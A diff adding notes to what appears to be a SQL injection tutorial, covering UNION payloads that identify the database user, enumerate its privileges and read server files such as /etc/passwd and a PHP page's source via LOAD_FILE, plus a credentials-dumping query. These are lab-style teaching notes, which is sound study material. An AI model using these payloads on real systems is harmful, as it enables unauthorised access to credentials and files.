@@ -224,3 +224,74 @@ Now that we have all the information, we can form our UNION query to dump data o
 ```sql
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
+
+
+# Reading files
+
+In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.
+
+Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.
+
+### DB user
+
+First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges.
+To be able to find our current DB user, we can use any of the following queries:
+
+- SELECT USER()
+- SELECT CURRENT_USER()
+- SELECT user from mysql.user
+
+Our UNION injection payload will be as follows:
+```sql
+cn' UNION SELECT 1, user(), 3, 4-- -
+```
+
+or:
+```sql
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+```
+
+Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+```
+
+If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+```
+
+We can also dump other privileges we have directly from the schema, with the following query:
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+```
+
+From here, we can add WHERE grantee="'root'@'localhost'" to only show our current user root privileges. Our payload would be:
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+
+### LOAD_FILE
+
+Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+Similar to how we have been using a UNION injection, we can use the above query:
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+
+
+### Another example to show code leakege
+
+We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+```
+
+If the code is rendered on the page, we can use the developers tool of browser in order to read it.
+
